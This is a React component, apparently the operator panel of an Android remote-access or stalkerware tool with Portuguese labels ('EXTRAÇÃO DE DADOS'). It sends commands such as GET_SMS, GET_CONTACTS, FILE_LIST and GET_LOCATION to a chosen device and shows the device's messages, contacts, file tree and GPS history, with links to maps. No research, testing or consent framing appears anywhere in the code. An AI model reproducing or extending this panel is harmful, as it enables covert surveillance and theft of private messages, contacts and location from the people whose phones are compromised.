import { useState } from 'react';
import useStore from '../../store/index.js';

export default function DataExtraction({ deviceId, onBack, sendCmd }) {
  const sms      = useStore(s => s.deviceSms);
  const contacts = useStore(s => s.deviceContacts);
  const location = useStore(s => s.deviceLocation);
  const refreshSms      = useStore(s => s.refreshSms);
  const refreshContacts = useStore(s => s.refreshContacts);
  const [tab, setTab]   = useState('sms');
  const [search, setSearch] = useState('');
  const [filePath, setFilePath] = useState('/');
  const [files, setFiles]       = useState([]);

  function browseFiles() {
    sendCmd('FILE_LIST', { path: filePath });
    fetch(`/api/devices/${deviceId}/files?path=${encodeURIComponent(filePath)}`)
      .then(r => r.json()).then(d => setFiles(d.files || [])).catch(() => {});
  }

  const filteredSms = search
    ? sms.filter(s => (s.body || '').toLowerCase().includes(search.toLowerCase()) || (s.address || '').includes(search))
    : sms;
  const filteredContacts = search
    ? contacts.filter(c => (c.name || '').toLowerCase().includes(search.toLowerCase()) || (c.number || '').includes(search))
    : contacts;

  const TABS = [
    { id: 'sms', label: 'SMS' },
    { id: 'contacts', label: 'Contatos' },
    { id: 'files', label: 'Arquivos' },
    { id: 'location', label: 'GPS' },
  ];

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">📁 EXTRAÇÃO DE DADOS</div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      <div className="row gap6 mb12" style={{ overflowX: 'auto' }}>
        {TABS.map(t => (
          <button key={t.id} className={`btn btn-sm ${tab === t.id ? 'btn-gold' : 'btn-ghost'}`}
            onClick={() => setTab(t.id)}>{t.label}</button>
        ))}
      </div>

      {/* Search */}
      {(tab === 'sms' || tab === 'contacts') && (
        <div className="input-row mb8">
          <input className="input" placeholder="Buscar..." value={search} onChange={e => setSearch(e.target.value)} />
          <button className="btn btn-ghost btn-sm" onClick={() => {
            if (tab === 'sms') { sendCmd('GET_SMS'); setTimeout(refreshSms, 1500); }
            else { sendCmd('GET_CONTACTS'); setTimeout(refreshContacts, 1500); }
          }}>↺</button>
        </div>
      )}

      {/* SMS */}
      {tab === 'sms' && (
        filteredSms.length === 0 ? <div className="no-data">Nenhuma SMS</div> :
        <div style={{ maxHeight: 500, overflowY: 'auto' }}>
          {filteredSms.map((s, i) => (
            <div key={i} className="card card-sm mb8">
              <div className="row-sb mb4">
                <span className="txt-sm bold txt-mono">{s.address}</span>
                <span className={`pill ${s.type === 'inbox' ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 9 }}>{s.type}</span>
              </div>
              <div className="txt-sm">{s.body}</div>
              <div className="txt-xs txt-dim mt4">{s.date ? new Date(s.date).toLocaleString() : ''}</div>
            </div>
          ))}
        </div>
      )}

      {/* Contacts */}
      {tab === 'contacts' && (
        filteredContacts.length === 0 ? <div className="no-data">Nenhum contato</div> :
        <div style={{ maxHeight: 500, overflowY: 'auto' }}>
          {filteredContacts.map((c, i) => (
            <div key={i} className="card card-sm mb6">
              <div className="row-sb">
                <span className="txt-sm bold">{c.name}</span>
                <span className="txt-sm txt-mono txt-dim">{c.number}</span>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Files */}
      {tab === 'files' && (
        <>
          <div className="input-row mb8">
            <input className="input" value={filePath} onChange={e => setFilePath(e.target.value)} placeholder="/" />
            <button className="btn btn-gold btn-sm" onClick={browseFiles}>BROWSE</button>
          </div>
          {files.length === 0 ? <div className="no-data">Vazio ou não carregado</div> :
            <div style={{ maxHeight: 400, overflowY: 'auto' }}>
              {files.map((f, i) => (
                <div key={i} className="card card-sm mb4" style={{ cursor: f.isDir ? 'pointer' : 'default' }}
                  onClick={() => { if (f.isDir) { const np = filePath.replace(/\/+$/, '') + '/' + f.name; setFilePath(np); browseFiles(); } }}>
                  <div className="row gap8">
                    <span style={{ fontSize: 18 }}>{f.isDir ? '📁' : '📄'}</span>
                    <span className="txt-sm flex1 ellipsis">{f.name}</span>
                    {f.size && <span className="txt-xs txt-dim">{f.size}</span>}
                  </div>
                </div>
              ))}
            </div>
          }
        </>
      )}

      {/* Location */}
      {tab === 'location' && (
        <>
          <button className="btn btn-gold btn-sm mb8" onClick={() => sendCmd('GET_LOCATION')}>📍 OBTER LOCALIZAÇÃO</button>
          {location.length === 0 ? <div className="no-data">Sem dados de localização</div> :
            <>
              {location[0] && (
                <div className="card mb8"
                  style={{ cursor: 'pointer' }}
                  onClick={() => window.open(`https://maps.google.com?q=${location[0].lat},${location[0].lng}`, '_blank')}>
                  <div className="txt-gold bold" style={{ fontSize: 18, marginBottom: 6 }}>📍</div>
                  <div className="txt-sm bold">{location[0].lat?.toFixed(6)}, {location[0].lng?.toFixed(6)}</div>
                  <div className="txt-xs txt-dim mt4">±{location[0].accuracy?.toFixed(0)}m</div>
                  {location[0].address && <div className="txt-xs txt-dim mt4">{location[0].address}</div>}
                  <div className="txt-xs txt-gold mt8">Toque para abrir no Maps</div>
                </div>
              )}
              <div style={{ maxHeight: 300, overflowY: 'auto' }}>
                {location.slice(1, 20).map((l, i) => (
                  <div key={i} className="card card-sm mb4"
                    style={{ cursor: 'pointer' }}
                    onClick={() => window.open(`https://maps.google.com?q=${l.lat},${l.lng}`, '_blank')}>
                    <div className="row-sb">
                      <span className="txt-xs txt-mono">{l.lat?.toFixed(5)}, {l.lng?.toFixed(5)}</span>
                      <span className="txt-xs txt-dim">{l.ts ? new Date(l.ts).toLocaleTimeString() : ''}</span>
                    </div>
                  </div>
                ))}
              </div>
            </>
          }
        </>
      )}

      <div style={{ height: 20 }} />
    </div>
  );
}
